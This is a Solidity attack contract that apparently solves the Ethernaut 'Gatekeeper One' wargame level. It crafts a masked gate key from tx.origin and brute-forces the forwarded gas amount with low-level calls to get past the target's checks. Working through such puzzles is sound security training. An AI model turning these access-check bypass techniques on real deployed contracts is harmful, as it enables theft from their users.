pragma solidity ^0.5;

contract HackGateKeeperOne {
  address internal victim;

  constructor (address _address) public {
    victim = _address;
  }

  function hack() public returns (bool) {
    address gateKey = tx.origin;
    bytes8 gateKey8 = bytes8(uint64(gateKey));
    bytes8 mask = 0xFFFFFFFF0000FFFF;
    bytes8 gateKeyPadded = gateKey8 & mask;

    // To avoid having to find out the exact amout of gas left using the debugger, we brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.

    bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), gateKeyPadded);

    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = victim.call.gas(i + 150 + 8191 * 4)(encodedParams);
      if (result) {
          return result;
      }
    }
  }
}
